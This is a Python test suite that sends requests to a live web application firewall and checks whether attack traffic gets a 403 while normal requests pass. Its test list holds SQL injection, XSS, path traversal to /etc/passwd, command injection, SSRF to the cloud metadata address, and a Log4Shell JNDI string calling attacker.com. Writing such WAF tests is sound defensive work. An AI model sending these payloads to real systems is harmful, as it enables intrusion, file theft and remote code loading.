#!/usr/bin/env python3
"""
WAF test suite – runs against a live WAF instance.
Usage: python3 test_waf.py [--waf-url http://localhost:8000]
"""

import sys
import json
import time
import argparse
import urllib.request
import urllib.error

PASS = "\033[92m✔\033[0m"
FAIL = "\033[91m✘\033[0m"
WARN = "\033[93m⚠\033[0m"


def request(method: str, url: str, body: bytes | None = None,
            headers: dict | None = None) -> tuple[int, bytes]:
    headers = headers or {}
    req = urllib.request.Request(url, data=body, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return 0, str(e).encode()


def run_tests(base: str):
    results = []

    tests = [
        # (description, method, path, body, headers, expect_blocked)

        # ── SQL Injection ─────────────────────────────────────────────
        ("SQLi: UNION SELECT",       "GET", "/?id=1 UNION SELECT * FROM users", None, {}, True),
        ("SQLi: OR 1=1",             "GET", "/?q=' OR '1'='1",                 None, {}, True),
        ("SQLi: sleep()",            "GET", "/?id=1;sleep(5)--",                None, {}, True),
        ("SQLi: in body (JSON)",     "POST", "/api", b'{"q":"SELECT * FROM passwords"}',
         {"Content-Type": "application/json"}, True),

        # ── XSS ──────────────────────────────────────────────────────
        ("XSS: script tag",          "GET", "/?x=<script>alert(1)</script>",    None, {}, True),
        ("XSS: javascript: URI",     "GET", "/?url=javascript:alert(1)",        None, {}, True),
        ("XSS: onerror attr",        "GET", '/?x=<img onerror="evil()">',       None, {}, True),
        ("XSS: iframe",              "GET", "/?x=<iframe src=x>",               None, {}, True),

        # ── Path Traversal ────────────────────────────────────────────
        ("PathTraversal: ../etc",    "GET", "/files/../../etc/passwd",           None, {}, True),
        ("PathTraversal: encoded",   "GET", "/?f=%2e%2e%2fetc%2fpasswd",        None, {}, True),

        # ── Command Injection ─────────────────────────────────────────
        ("CMDi: semicolon+ls",       "GET", "/?cmd=id;ls+-la",                  None, {}, True),
        ("CMDi: backtick",           "GET", "/?x=`whoami`",                     None, {}, True),

        # ── SSRF ──────────────────────────────────────────────────────
        ("SSRF: localhost",          "GET", "/?url=http://localhost/admin",      None, {}, True),
        ("SSRF: 169.254 metadata",   "GET", "/?url=http://169.254.169.254/",    None, {}, True),

        # ── Log4Shell ─────────────────────────────────────────────────
        ("Log4Shell: jndi ldap",     "GET", "/",  None,
         {"User-Agent": "${jndi:ldap://attacker.com/x}"}, True),

        # ── Scanner UA ────────────────────────────────────────────────
        ("BlockedUA: sqlmap",        "GET", "/", None,
         {"User-Agent": "sqlmap/1.7"}, True),
        ("BlockedUA: nikto",         "GET", "/", None,
         {"User-Agent": "Nikto/2.1.6"}, True),

        # ── Oversized ─────────────────────────────────────────────────
        ("OverSize: URL",            "GET", "/?" + "A" * 2500,                  None, {}, True),

        # ── Legitimate (should pass) ──────────────────────────────────
        ("Legit: normal GET",        "GET",  "/",              None, {}, False),
        ("Legit: search param",      "GET",  "/?q=hello+world",None, {}, False),
        ("Legit: JSON POST",         "POST", "/api",
         b'{"name":"Alice","age":30}',
         {"Content-Type": "application/json"}, False),
    ]

    print(f"\n{'─'*60}")
    print(f"  WAF Test Suite  →  {base}")
    print(f"{'─'*60}\n")
    print(f"  {'Result':<8} {'Attack expected':<8} {'Test'}")
    print(f"  {'──────':<8} {'────────':<8} {'────'}")

    for desc, method, path, body, headers, expect_blocked in tests:
        code, resp_bytes = request(method, base + path, body, headers)
        was_blocked = code == 403

        if expect_blocked and was_blocked:
            icon = PASS
            outcome = "PASS"
        elif not expect_blocked and not was_blocked:
            icon = PASS
            outcome = "PASS"
        else:
            icon = FAIL
            outcome = "FAIL"

        results.append(outcome == "PASS")
        expected_str = "block" if expect_blocked else "pass "
        got_str = f"HTTP {code}"
        print(f"  {icon} {expected_str:<8} {desc:<45} ({got_str})")

    total = len(results)
    passed = sum(results)
    print(f"\n{'─'*60}")
    print(f"  Results: {passed}/{total} passed")
    if passed == total:
        print(f"  {PASS} All tests passed!")
    else:
        print(f"  {FAIL} {total - passed} test(s) failed")
    print(f"{'─'*60}\n")

    return passed == total


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--waf-url", default="http://localhost:8000")
    args = parser.parse_args()

    success = run_tests(args.waf_url)
    sys.exit(0 if success else 1)
